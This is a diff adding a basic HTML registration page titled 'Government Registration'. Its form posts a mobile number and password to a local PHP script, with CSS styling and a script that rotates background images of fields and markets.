@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Government Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .container {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.8); /* Reduced opacity */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: green;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: darkgreen;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Government Registration</h2>
+        <form action="greg.php" method="POST">
+            <input type="text" name="mobile_number" placeholder="Mobile Number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Register">
+        </form>
+    </div>
+
+    <script>
+        // Array of background image URLs
+        var images = [
+            'login1.jpg',
+            'paddy.jpg',
+            'market3.jpg'
+        ];
+
+        // Function to change background image dynamically
+        function changeBackground() {
+            var index = Math.floor(Math.random() * images.length); // Get random index
+            document.body.style.backgroundImage = 'url(' + images[index] + ')'; // Change background image
+        }
+
+        // Call the function initially
+        changeBackground();
+
+        // Call the function every 10 seconds to change the background image
+        setInterval(changeBackground, 10000);
+    </script>
+</body>
+</html>
